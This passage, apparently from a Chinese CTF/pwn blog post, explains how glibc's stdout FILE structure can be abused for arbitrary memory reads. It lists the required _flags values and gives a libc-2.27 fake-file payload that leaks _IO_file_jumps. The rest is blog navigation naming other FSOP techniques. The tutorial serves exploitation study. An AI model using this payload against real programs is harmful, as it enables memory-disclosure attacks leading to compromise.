从_IO_write_base开始，输出(_IO_write_ptr - f-&gt;_IO_write_base)个字节的数据</span></span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br><span class="line">    </span><br><span class="line"><span class="type">static</span> _IO_size_t <span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="comment">// 为了不执行else if分支中的内容以产生错误，可构造_flags包含_IO_IS_APPENDING 或 设置_IO_read_end等于_IO_write_base</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用函数输出输出缓冲区</span></span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>综上，为了做到<strong>任意读</strong>，需要满足如下条件：<br>(1) 设置<code>_flag &amp;~ _IO_NO_WRITES</code>，即<code>_flag &amp;~ 0x8</code>；<br>(2) 设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>，即<code>_flag | 0x800</code>；<br>(3) 设置<code>_fileno</code>为<code>1</code>(stdout)；<br>(4) 设置<code>_IO_write_base</code>指向想要泄露的地方，<code>_IO_write_ptr</code>指向泄露结束的地址；<br>(5) 设置<code>_IO_read_end</code>等于<code>_IO_write_base</code> 或 设置<code>_flag &amp; _IO_IS_APPENDING</code>即，<code>_flag | 0x1000</code>。<br>此外，有一个<strong>大前提</strong>：需要调用<code>_IO_OVERFLOW()</code>才行，因此**需使得需要输出的内容中含有<code>\n</code>换行符 或 设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>**（输出缓冲区无剩余空间）等。<br>一般来说，经常利用<code>puts</code>函数加上述<code>stdout</code>任意读的方式泄露<code>libc</code>。</p>
+<p>flag的构造如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span> </span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>
+
+<p>例如在<code>libc-2.27</code>下，构造<code>fakefile = p64(0xfbad1800) + p64(0)*3 + b&#39;\x58&#39;</code>（<code>\x58</code>覆盖<code>write_base</code>的低位），泄露出的第一个地址即为<code>_IO_file_jumps</code>的地址。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/IO-FILE/" rel="tag"># IO_FILE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/02/Kernel_Basic_Knowledge/" rel="prev" title="Kernel Basic Knowledge">
+      <i class="fa fa-chevron-left"></i> Kernel Basic Knowledge
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/02/Docker/" rel="next" title="Docker的使用">
+      Docker的使用 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE"><span class="nav-number">1.</span> <span class="nav-text">_IO_FILE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-JUMP-t%E8%99%9A%E8%A1%A8"><span class="nav-number">2.</span> <span class="nav-text">_IO_JUMP_t虚表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%99%9A%E8%A1%A8%E5%92%8C%E8%99%9A%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.</span> <span class="nav-text">虚表和虚函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-JUMP-T%E7%BB%93%E6%9E%84"><span class="nav-number">2.2.</span> <span class="nav-text">_IO_JUMP_T结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%E7%AE%80%E4%BB%8B"><span class="nav-number">2.3.</span> <span class="nav-text">部分文件操作函数简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fread"><span class="nav-number">2.3.1.</span> <span class="nav-text">fread</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fwrite"><span class="nav-number">2.3.2.</span> <span class="nav-text">fwrite</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fopen"><span class="nav-number">2.3.3.</span> <span class="nav-text">fopen</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fclose"><span class="nav-number">2.3.4.</span> <span class="nav-text">fclose</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#printf-puts"><span class="nav-number">2.3.5.</span> <span class="nav-text">printf&#x2F;puts</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">IO_FILE利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9fileno%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.</span> <span class="nav-text">对fileno的利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0-vtable-%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B-libc2-23%E5%8F%8A%E4%BB%A5%E5%89%8D"><span class="nav-number">3.2.</span> <span class="nav-text">伪造 vtable 劫持程序流程(libc2.23及以前)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FSOP"><span class="nav-number">3.3.</span> <span class="nav-text">FSOP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#glibc2-24%E5%90%8E%E7%9A%84IO-FILE%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">glibc2.24后的IO_FILE利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-str-jumps%E7%9A%84FSOP-2-28%E5%8F%8A%E4%BB%A5%E5%90%8E%E5%A4%B1%E6%95%88"><span class="nav-number">4.1.</span> <span class="nav-text">_IO_str_jumps的FSOP(2.28及以后失效)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-wide-data%EF%BC%88House-of-Apple%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">_IO_wide_data（House of Apple）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-FILE%E4%B8%ADfile%E7%9A%84%E8%AF%BB%E5%86%99%E6%8C%87%E9%92%88%E5%88%A9%E7%94%A8"><span class="nav-number">4.3.</span> <span class="nav-text">IO_FILE中file的读写指针利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8stdin%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%86%99"><span class="nav-number">4.3.1.</span> <span class="nav-text">利用stdin进行任意写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8stdout%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E8%AF%BB-%E5%86%99"><span class="nav-number">4.3.2.</span> <span class="nav-text">利用stdout进行任意读&#x2F;写</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="a1ph0nse"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">a1ph0nse</p>
+  <div class="site-description" itemprop="description">pwn菜狗、cs菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a1ph0nse</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
